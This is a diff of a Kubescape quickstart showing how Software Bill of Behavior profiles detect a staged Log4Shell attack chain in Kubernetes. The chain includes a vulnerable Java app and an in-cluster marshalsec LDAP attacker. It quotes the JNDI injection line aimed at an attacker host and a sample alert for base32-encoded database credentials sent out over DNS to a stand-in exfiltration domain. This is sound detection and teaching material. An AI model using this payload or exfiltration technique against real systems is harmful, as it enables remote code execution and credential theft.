@@ -1,4 +1,4 @@
-# Quickstart
+# Quickstart Software Bill of Behavior (SBOB)
 
 Here, Kubescape uses an SBOB to catch a live Log4Shell RCE — a shell spawned by a JVM worker thread, its pivot and
 exfiltration children, every one of them outside the workload's declared Software Bill of Behavior:
@@ -8,8 +8,9 @@ exfiltration children, every one of them outside the workload's declared Softwar
 We published a *"harmless"* demo of
 [`log4shell`](https://github.com/k8sstormcenter/bob/tree/main/example/log4j-chain) — a
 `frontend → java-backend → postgres` deployment, while mocking the `external payload` and the `exfiltration domain`.
-The standard chaining injects a `jndi` string via http, that gets resolved to an `ldap` server, from which a `jar` file is downloaded that drops into a shell, 
-our chain continues to connect to postgres via `psql` and to exfiltrate the `base32` encoded stolen data.
+
+The attack-chain injects a `JNDI` via http-header, that gets resolved via an `ldap` server, to download a `jar` file is downloaded into the running jvm to spawn a shell. 
+Our chain continues to connect to postgres via `psql` and to exfiltrate the `base32` encoded stolen DB-data via DNS.
 
 
 !!! note "What you need"
@@ -19,7 +20,7 @@ our chain continues to connect to postgres via `psql` and to exfiltrate the `bas
 
 ## 1. Install Kubescape with runtime detection on
 
-The `sbob-rc3` chart currently ships as a **fork release**  and you need the `Kubescape Node-agent` and `Kubescape Storage` component
+You need the `Kubescape Node-Agent` and `Kubescape Storage` component
 
 ```bash
 CHART=https://github.com/k8sstormcenter/helm-charts/releases/download/kubescape-operator-1.40.3-sbob-rc3.1/kubescape-operator-1.40.3-sbob-rc3.1.tgz
@@ -31,12 +32,22 @@ helm install kubescape "$CHART" \
 ```
 
 Node-agent writes alerts to **stdout** by default — read them with `kubectl logs`.
-This walkthrough covers **R0001** (Unknown process executed), you should note that the network alerts often depend on actual resolution.
-So **R0005** (DNS exfil) and **R0011** (Unexpected egress) needs an external connection and is covered in the [last paragraph](#also-see-the-egress-rule-r0011).
+This walkthrough covers various exceptions,  you should note that the network alerts often depend on actual resolution.
+So **R0005** (DNS exfil) and **R0011** (Unexpected egress) needs an external connection. You can follow along without placing the LDAP and attacker-server
+on a public location and read adapt the CEL rules to understand which rules fire exactly when.
 
 
-As long as we havnt migrated to Containerprofiles, the general pattern is to ensure that sbobs of `your-sbob-name` exist and to bind
-them via labels on each pod
+The general pattern is to ensure that sbobs of `your-sbob-name` exist and to bind
+them via labels on each pod[^migration]
+
+
+[^migration]: The first implementation currently relies on the CRDs `ApplicationProfile`
+    and `NetworkNeighborhood`, but we will migrate them to `ContainerProfile` asap.
+    The functionality itself will not be affected.
+
+    Currently, you need to apply the CRD to the cluster **before** the workload and ensure
+    the labels are correct.
+
 ```yaml
 spec:
   template:
@@ -64,7 +75,7 @@ for w in backend frontend observer postgres; do
 done
 ```
 
-Two sections of the java-backend's SBOB are worth highlighting as the behavior here is now different from before:
+Two sections of the java-backend's SBOB are worth highlighting:
 
 ```yaml
 # ap-chain-backend.yaml 
@@ -114,13 +125,13 @@ CoreDNS so it takes effect:
 kubectl apply -f https://raw.githubusercontent.com/k8sstormcenter/bob/main/example/log4j-chain/exfil-dns.yaml
 kubectl -n kube-system rollout restart deploy/coredns
 ```
-!!! note " SKIP this in any cluster, you will not throw-away - this kaputts dns"  
+!!! note " SKIP this in any non-throwaway cluster- this kaputts dns"  
 
 
 ## 4. Deploy the vulnerable app + the attacker
 
-Bring up the whole chain (`log4j-poc`)[^scenarios], with the pods labelled `user-defined-profile/network` to bind the profiles from step 2. 
-The manifest also includes the in-cluster attacker: a marshalsec LDAP server and a class-file HTTP server.
+Bring up the whole `log4j-poc`[^scenarios], all pods labelled `user-defined-profile/network` to bind the profiles from Step 2.  
+The manifest also includes the attacker: a marshalsec LDAP server and a class-file HTTP server.
 
 [^scenarios]: 
 **B** `distroless` — `ghcr.io/k8sstormcenter/log4j-chain-backend-contained@sha256:f71e03993fec4df6ea947eda235d072f5c37569491fd32512a6d793369852e35`   
@@ -132,7 +143,7 @@ kubectl -n log4j-poc rollout status deploy/chain-backend --timeout=120s
 kubectl -n attacker-ns rollout status deploy/attacker --timeout=60s
 ```
 
-There are two non-vulnerable images [^scenarios], so you can contrast the detection, default is the vulnerable:
+There are two non-vulnerable images[^scenarios], so you can contrast the detection, default is the vulnerable:
 
 ```yaml
 # backend container, in log4j-chain.yaml
@@ -151,7 +162,7 @@ curl -sL https://raw.githubusercontent.com/k8sstormcenter/bob/main/example/log4j
 The single line that is the attack:
 
 ```yaml
-# attack-pod.yaml — the probe
+# attack-pod.yaml 
 args: [ curl, -s, -A,
         '${jndi:ldap://attacker.attacker-ns.svc.cluster.local:1389/Payload}',
         'http://frontend:8080/api/products?q=test' ]
@@ -180,7 +191,7 @@ kubectl -n log4j-poc get networkneighborhood chain-backend \
 ```
  -->
 
-Read the raw alerts — **one JSON object per rule violation**:
+Read the raw alerts 
 
 ```bash
 kubectl -n kubescape logs -l app=node-agent --tail=200 | grep '"RuleID":"R' \
@@ -208,7 +219,7 @@ java  (parent: containerd-shim)
 
 !!! tip "Not every executable in the process tree is actually executed"
     Careful when reading these alerts, only the uppermost process is the one eBPF saw with exec_cve. It may have further forks (`-c`) but if you dont see
-    those alerting, they may still have failed. Test this yourself with the patched and the distroless image 
+    those alerting, they may still have failed. Test this yourself with the patched and the distroless image[^scenarios] 
 
 #### R0005 — data exfiltration over DNS
 
@@ -219,7 +230,7 @@ java  (parent: containerd-shim)
  "domain":"OBXXG5DHOJSXGOTQN5ZXIZ3SMVZQ.exfil.attacker.example.com.","protocol":"UDP","port":39361}
 ```
 
-Decode the label — `echo OBXXG5DHOJSXGOTQN5ZXIZ3SMVZQ | base32 -d` → **`postgres:postgres`** 
+Decode  — `echo OBXXG5DHOJSXGOTQN5ZXIZ3SMVZQ | base32 -d` **`postgres:postgres`** 
 
 
 
